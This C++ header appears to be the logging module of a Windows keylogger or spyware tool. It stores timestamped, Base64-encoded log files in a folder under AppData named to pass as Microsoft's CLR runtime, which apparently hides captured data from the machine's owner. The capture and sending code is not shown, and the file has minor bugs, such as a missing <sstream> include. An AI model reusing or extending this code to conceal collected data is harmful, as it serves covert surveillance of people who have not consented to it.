#ifndef IO_H_INCLUDED
#define IO_H_INCLUDED

#include <string>
#include <cstdlib>
#include <fstream>
#include "windows.h"
#include "helper.h"
#include "Encryption.h"

//IO.h will handle the input/output to the log file
namespace IO
{
    //gets the path of where the log is going to be stored
    std::wstring GetOurPath(const bool append_seperator = false)
    {
		wchar_t* buf = nullptr;
		size_t size = 0;
		errno_t err = _wdupenv_s(&buf, &size, L"APPDATA");
        std::wstring appdata_dir(buf);
        std::wstring full = appdata_dir + L"\\Microsoft\\CLR";
        return full + (append_seperator ? L"\\" : L"");

    }

    //creates the directory
    bool MkOneDr(std::wstring path)
    {
        return (bool)CreateDirectoryW(path.c_str(), NULL) ||
        GetLastError() == ERROR_ALREADY_EXISTS;
    }

    bool MKDir(std::wstring path)
    {
        //this for-loop is using a char pointer to go thru the wstring
        for(auto &c : path)
        {
            if(c == L'\\')
            {
                c = L'\0';
                if(!MkOneDr(path))
                {
                    return false;
                }
                c = L'\\';
            }
        }
        return true;
    }

    template <class T>
    std::wstring WriteLog(const T &t)
    {
        std::wstring path = GetOurPath(true);
        Helper::DateTime dt;
        std::wstring name = dt.GetDateTimeString(L"_") + L".log";
        try
        {
            std::wofstream file(path + name);
            if(!file) 
				return L"";

            std::wostringstream s;
            s << L"[" << dt.GetDateTimeString() << L"]" <<
            std::endl << t <<std::endl;
            std::wstring data = Encryption::EncryptB64(s.str());
            file<<data;

            if(!file)
            {
                return L"";
            }

            file.close();
            return name;
        }
        catch(...)
        {
            return L"";
        }
    }
}

#endif // IO_H_INCLUDED
